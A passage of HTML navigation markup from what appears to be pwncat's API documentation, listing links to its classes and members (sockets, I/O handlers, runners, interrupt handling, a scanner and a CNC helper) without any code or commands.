                                    title="pwncat.CNC.remote_py3">remote_py3</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.remote_python"
                                    title="pwncat.CNC.remote_python">remote_python</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.CNC.send"
                                         title="pwncat.CNC.send">send</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNC.send_recv"
                                    title="pwncat.CNC.send_recv">send_recv</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.CNC.upload"
                                         title="pwncat.CNC.upload">upload</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.CNCAutoDeploy"
                                     title="pwncat.CNCAutoDeploy">CNCAutoDeploy</a></code>
                        </h4>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.CNCPythonNotFound"
                                title="pwncat.CNCPythonNotFound">CNCPythonNotFound</a></code>
                        </h4>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.ColoredLogFormatter"
                                title="pwncat.ColoredLogFormatter">ColoredLogFormatter</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ColoredLogFormatter.COLORS"
                                    title="pwncat.ColoredLogFormatter.COLORS">COLORS</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ColoredLogFormatter.COLOR_DEF"
                                    title="pwncat.ColoredLogFormatter.COLOR_DEF">COLOR_DEF</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ColoredLogFormatter.COLOR_RST"
                                    title="pwncat.ColoredLogFormatter.COLOR_RST">COLOR_RST</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.ColoredLogFormatter.format"
                                    title="pwncat.ColoredLogFormatter.format">format</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsCallableProducer"
                                title="pwncat.DsCallableProducer">DsCallableProducer</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsCallableProducer.args"
                                    title="pwncat.DsCallableProducer.args">args</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsCallableProducer.function"
                                    title="pwncat.DsCallableProducer.function">function</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsCallableProducer.kwargs"
                                    title="pwncat.DsCallableProducer.kwargs">kwargs</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsIOCommand"
                                     title="pwncat.DsIOCommand">DsIOCommand</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOCommand.bufsize"
                                    title="pwncat.DsIOCommand.bufsize">bufsize</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOCommand.enc"
                                    title="pwncat.DsIOCommand.enc">enc</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOCommand.executable"
                                    title="pwncat.DsIOCommand.executable">executable</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli"
                                     title="pwncat.DsIONetworkCli">DsIONetworkCli</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli.reconn"
                                    title="pwncat.DsIONetworkCli.reconn">reconn</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli.reconn_robin"
                                    title="pwncat.DsIONetworkCli.reconn_robin">reconn_robin</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkCli.reconn_wait"
                                    title="pwncat.DsIONetworkCli.reconn_wait">reconn_wait</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSock"
                                title="pwncat.DsIONetworkSock">DsIONetworkSock</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSock.recv_timeout_retry"
                                    title="pwncat.DsIONetworkSock.recv_timeout_retry">recv_timeout_retry</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv"
                                     title="pwncat.DsIONetworkSrv">DsIONetworkSrv</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv.keep_open"
                                    title="pwncat.DsIONetworkSrv.keep_open">keep_open</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv.rebind"
                                    title="pwncat.DsIONetworkSrv.rebind">rebind</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv.rebind_robin"
                                    title="pwncat.DsIONetworkSrv.rebind_robin">rebind_robin</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSrv.rebind_wait"
                                    title="pwncat.DsIONetworkSrv.rebind_wait">rebind_wait</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsIOStdinStdout"
                                title="pwncat.DsIOStdinStdout">DsIOStdinStdout</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOStdinStdout.enc"
                                    title="pwncat.DsIOStdinStdout.enc">enc</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOStdinStdout.input_timeout"
                                    title="pwncat.DsIOStdinStdout.input_timeout">input_timeout</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOStdinStdout.send_on_eof"
                                    title="pwncat.DsIOStdinStdout.send_on_eof">send_on_eof</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction"
                                     title="pwncat.DsRunnerAction">DsRunnerAction</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.code"
                                    title="pwncat.DsRunnerAction.code">code</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.consumer"
                                    title="pwncat.DsRunnerAction.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.daemon_thread"
                                    title="pwncat.DsRunnerAction.daemon_thread">daemon_thread</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.interrupts"
                                    title="pwncat.DsRunnerAction.interrupts">interrupts</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.producer"
                                    title="pwncat.DsRunnerAction.producer">producer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerAction.transformers"
                                    title="pwncat.DsRunnerAction.transformers">transformers</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater"
                                title="pwncat.DsRunnerRepeater">DsRunnerRepeater</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.action"
                                    title="pwncat.DsRunnerRepeater.action">action</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.args"
                                    title="pwncat.DsRunnerRepeater.args">args</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.kwargs"
                                    title="pwncat.DsRunnerRepeater.kwargs">kwargs</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.pause"
                                    title="pwncat.DsRunnerRepeater.pause">pause</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.repeat"
                                    title="pwncat.DsRunnerRepeater.repeat">repeat</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerRepeater.ssig"
                                    title="pwncat.DsRunnerRepeater.ssig">ssig</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer"
                                     title="pwncat.DsRunnerTimer">DsRunnerTimer</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer.action"
                                    title="pwncat.DsRunnerTimer.action">action</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer.args"
                                    title="pwncat.DsRunnerTimer.args">args</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer.intvl"
                                    title="pwncat.DsRunnerTimer.intvl">intvl</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer.kwargs"
                                    title="pwncat.DsRunnerTimer.kwargs">kwargs</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsRunnerTimer.ssig"
                                    title="pwncat.DsRunnerTimer.ssig">ssig</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsSock"
                                     title="pwncat.DsSock">DsSock</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.backlog"
                                    title="pwncat.DsSock.backlog">backlog</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.bufsize"
                                    title="pwncat.DsSock.bufsize">bufsize</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.info"
                                    title="pwncat.DsSock.info">info</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ip_tos"
                                    title="pwncat.DsSock.ip_tos">ip_tos</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ipv4"
                                    title="pwncat.DsSock.ipv4">ipv4</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ipv6"
                                    title="pwncat.DsSock.ipv6">ipv6</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.nodns"
                                    title="pwncat.DsSock.nodns">nodns</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.recv_timeout"
                                    title="pwncat.DsSock.recv_timeout">recv_timeout</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.src_addr"
                                    title="pwncat.DsSock.src_addr">src_addr</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.src_port"
                                    title="pwncat.DsSock.src_port">src_port</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp"
                                         title="pwncat.DsSock.udp">udp</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp_sconnect"
                                    title="pwncat.DsSock.udp_sconnect">udp_sconnect</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp_sconnect_word"
                                    title="pwncat.DsSock.udp_sconnect_word">udp_sconnect_word</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed"
                                title="pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformLinefeed.crlf"
                                    title="pwncat.DsTransformLinefeed.crlf">crlf</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformSafeword"
                                title="pwncat.DsTransformSafeword">DsTransformSafeword</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformSafeword.safeword"
                                    title="pwncat.DsTransformSafeword.safeword">safeword</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsTransformSafeword.ssig"
                                    title="pwncat.DsTransformSafeword.ssig">ssig</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                                     title="pwncat.IO">IO</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IO.consumer"
                                    title="pwncat.IO.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IO.interrupt"
                                    title="pwncat.IO.interrupt">interrupt</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.log"
                                         title="pwncat.IO.log">log</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IO.producer"
                                    title="pwncat.IO.producer">producer</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IO.ssig"
                                         title="pwncat.IO.ssig">ssig</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IOCommand"
                                     title="pwncat.IOCommand">IOCommand</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOCommand.consumer"
                                    title="pwncat.IOCommand.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOCommand.interrupt"
                                    title="pwncat.IOCommand.interrupt">interrupt</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOCommand.producer"
                                    title="pwncat.IOCommand.producer">producer</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                                     title="pwncat.IONetwork">IONetwork</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork.consumer"
                                    title="pwncat.IONetwork.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork.interrupt"
                                    title="pwncat.IONetwork.interrupt">interrupt</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork.net"
                                    title="pwncat.IONetwork.net">net</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork.producer"
                                    title="pwncat.IONetwork.producer">producer</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner"
                                title="pwncat.IONetworkScanner">IONetworkScanner</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.BANNER_PAYLOADS"
                                    title="pwncat.IONetworkScanner.BANNER_PAYLOADS">BANNER_PAYLOADS</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.BANNER_REG"
                                    title="pwncat.IONetworkScanner.BANNER_REG">BANNER_REG</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.BANNER_REG_COMP"
                                    title="pwncat.IONetworkScanner.BANNER_REG_COMP">BANNER_REG_COMP</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.consumer"
                                    title="pwncat.IONetworkScanner.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.interrupt"
                                    title="pwncat.IONetworkScanner.interrupt">interrupt</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner.producer"
                                    title="pwncat.IONetworkScanner.producer">producer</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.IOStdinStdout"
                                     title="pwncat.IOStdinStdout">IOStdinStdout</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOStdinStdout.consumer"
                                    title="pwncat.IOStdinStdout.consumer">consumer</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOStdinStdout.interrupt"
                                    title="pwncat.IOStdinStdout.interrupt">interrupt</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IOStdinStdout.producer"
                                    title="pwncat.IOStdinStdout.producer">producer</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                title="pwncat.InterruptHandler">InterruptHandler</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.has_command_quit"
                                    title="pwncat.InterruptHandler.has_command_quit">has_command_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.has_sock_quit"
                                    title="pwncat.InterruptHandler.has_sock_quit">has_sock_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.has_sock_send_eof"
                                    title="pwncat.InterruptHandler.has_sock_send_eof">has_sock_send_eof</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.has_stdin_quit"
                                    title="pwncat.InterruptHandler.has_stdin_quit">has_stdin_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.has_terminate"
                                    title="pwncat.InterruptHandler.has_terminate">has_terminate</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_command_eof"
                                    title="pwncat.InterruptHandler.raise_command_eof">raise_command_eof</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_command_quit"
                                    title="pwncat.InterruptHandler.raise_command_quit">raise_command_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_sock_eof"
                                    title="pwncat.InterruptHandler.raise_sock_eof">raise_sock_eof</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_sock_quit"
                                    title="pwncat.InterruptHandler.raise_sock_quit">raise_sock_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_sock_send_eof"
                                    title="pwncat.InterruptHandler.raise_sock_send_eof">raise_sock_send_eof</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_stdin_eof"
                                    title="pwncat.InterruptHandler.raise_stdin_eof">raise_stdin_eof</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_stdin_quit"
                                    title="pwncat.InterruptHandler.raise_stdin_quit">raise_stdin_quit</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler.raise_terminate"
                                    title="pwncat.InterruptHandler.raise_terminate">raise_terminate</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Net"
                                     title="pwncat.Net">Net</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.close_bind_sock"
                                    title="pwncat.Net.close_bind_sock">close_bind_sock</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.close_conn_sock"
                                    title="pwncat.Net.close_conn_sock">close_conn_sock</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.re_accept_client"
                                    title="pwncat.Net.re_accept_client">re_accept_client</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.receive"
                                    title="pwncat.Net.receive">receive</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.run_client"
                                    title="pwncat.Net.run_client">run_client</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.run_server"
                                    title="pwncat.Net.run_server">run_server</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Net.send"
                                         title="pwncat.Net.send">send</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Net.send_eof"
                                    title="pwncat.Net.send_eof">send_eof</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore"
                                     title="pwncat.PSEStore">PSEStore</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore.log"
                                    title="pwncat.PSEStore.log">log</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore.messages"
                                    title="pwncat.PSEStore.messages">messages</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore.net"
                                    title="pwncat.PSEStore.net">net</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore.ssig"
                                    title="pwncat.PSEStore.ssig">ssig</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.PSEStore.store"
                                    title="pwncat.PSEStore.store">store</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Runner"
                                     title="pwncat.Runner">Runner</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Runner.add_action"
                                    title="pwncat.Runner.add_action">add_action</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Runner.add_repeater"
                                    title="pwncat.Runner.add_repeater">add_repeater</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Runner.add_timer"
                                    title="pwncat.Runner.add_timer">add_timer</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Runner.run"
                                         title="pwncat.Runner.run">run</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Sock"
                                     title="pwncat.Sock">Sock</a></code>
                        </h4>
                        <ul class="two-column">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.accept"
                                    title="pwncat.Sock.accept">accept</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Sock.bind"
                                         title="pwncat.Sock.bind">bind</a></code>
                            </li>
                            <li><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Sock.close"
                                         title="pwncat.Sock.close">close</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.connect"
                                    title="pwncat.Sock.connect">connect</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.create_socket"
                                    title="pwncat.Sock.create_socket">create_socket</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.get_family_name"
                                    title="pwncat.Sock.get_family_name">get_family_name</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.get_iptos_by_name"
                                    title="pwncat.Sock.get_iptos_by_name">get_iptos_by_name</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.get_sock_opts"
                                    title="pwncat.Sock.get_sock_opts">get_sock_opts</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.get_type_name"
                                    title="pwncat.Sock.get_type_name">get_type_name</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.gethostbyname"
                                    title="pwncat.Sock.gethostbyname">gethostbyname</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.is_ipv4_address"
                                    title="pwncat.Sock.is_ipv4_address">is_ipv4_address</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.is_ipv6_address"
                                    title="pwncat.Sock.is_ipv6_address">is_ipv6_address</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.listen"
                                    title="pwncat.Sock.listen">listen</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.shutdown_recv"
                                    title="pwncat.Sock.shutdown_recv">shutdown_recv</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Sock.shutdown_send"
                                    title="pwncat.Sock.shutdown_send">shutdown_send</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                     title="pwncat.StringEncoder">StringEncoder</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder.CODECS"
                                    title="pwncat.StringEncoder.CODECS">CODECS</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder.decode"
                                    title="pwncat.StringEncoder.decode">decode</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder.encode"
                                    title="pwncat.StringEncoder.encode">encode</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder.rstrip"
                                    title="pwncat.StringEncoder.rstrip">rstrip</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger"
                                     title="pwncat.TraceLogger">TraceLogger</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger.LEVEL_NAME"
                                    title="pwncat.TraceLogger.LEVEL_NAME">LEVEL_NAME</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger.LEVEL_NUM"
                                    title="pwncat.TraceLogger.LEVEL_NUM">LEVEL_NUM</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger.trace"
                                    title="pwncat.TraceLogger.trace">trace</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a href="https://pwncat.org/pwncat.api.html#pwncat.Transform"
                                     title="pwncat.Transform">Transform</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Transform.log"
                                    title="pwncat.Transform.log">log</a></code>
                            </li>
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.Transform.transform"
                                    title="pwncat.Transform.transform">transform</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpPack"
                                title="pwncat.TransformHttpPack">TransformHttpPack</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpPack.transform"
